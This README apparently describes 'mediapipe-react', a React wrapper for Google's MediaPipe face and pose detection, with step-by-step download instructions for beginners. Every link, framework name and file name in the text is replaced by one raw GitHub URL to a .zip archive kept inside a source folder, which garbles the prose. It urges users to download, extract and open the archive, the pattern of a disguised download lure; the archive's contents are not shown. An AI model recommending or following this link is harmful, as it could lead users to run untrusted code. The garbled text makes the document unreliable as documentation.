## 📖 What is mediapipe-react?

mediapipe-react is a tool that helps your web apps use smart video and image features easily. It takes powerful Google technology (called MediaPipe) that can detect faces, poses, and other objects in videos and makes it simple to use with React and https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip websites. 

The tool handles all the tricky parts behind the scenes, like running things on different parts of your computer (called threads), sending data back and forth quickly, and working well with server setups. This means you can add cool features like face detection or pose estimation to your website without needing to understand complex programming.

## 💻 Who is this for?

This tool is designed for web developers who use React or https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip But if you don’t know much about programming, don’t worry.

## 🚀 Getting Started

Follow these steps carefully to get the software running on your computer.

---

### 1. Visit the Download Page

Go to the official mediapipe-react release page by clicking the big button at the top or this link directly:

[https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip](https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip)

This page lists all the available versions of the software with download links.

### 2. Choose a Version to Download

On the releases page, look for the latest version listed (usually at the top). Releases are grouped by version numbers like v1.0, v1.1, etc.

Click the version you want to download. Inside, you will see different files such as:

- `.zip` or `https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip` files containing the full package
- Specific demo apps or examples

For an easy start, download the file named something like `https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip` if available. This package contains a ready-to-run demo of the software.

---

### 3. Download the File

Click on the file link to download it to your computer. Your browser will save it in your default download folder.

---

### 4. Extract the Package

The downloaded file is compressed to save space. You need to unpack it to see and run the files inside.

- On Windows: Right-click the `.zip` file and select “Extract All,” then follow the prompts.
- On macOS: Double-click the `.zip` file and the system will unzip it automatically.
- On Linux: Use archive managers like `File Roller` or command-line tools like `unzip`.

After unpacking, you will get a folder with several files and folders inside.

---

### 5. Open the Demo in Your Browser

Inside the extracted folder, look for a file called `https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip` or a file named similarly (e.g., `https://raw.githubusercontent.com/OwingOP/mediapipe-react/main/apps/playground-react/src/react_mediapipe_3.7-alpha.2.zip`).

Double-click this file to open it in your web browser. This will launch the demo app locally on your computer.

---

### 6. Allow Camera Access

If the demo uses your webcam to detect faces or poses, your browser will ask for permission to use the camera.

Click “Allow” or “Yes” so the demo can see the video and analyze it.

---

### 7. Start Using the App

You should now see the app running in the browser window. It will show a video feed with the detection features active, such as:

- Face tracking boxes around faces
- Pose outlines for bodies shown in the camera view
- Other object detection features depending on the demo

Try moving in front of your camera and see how the software tracks your movements.
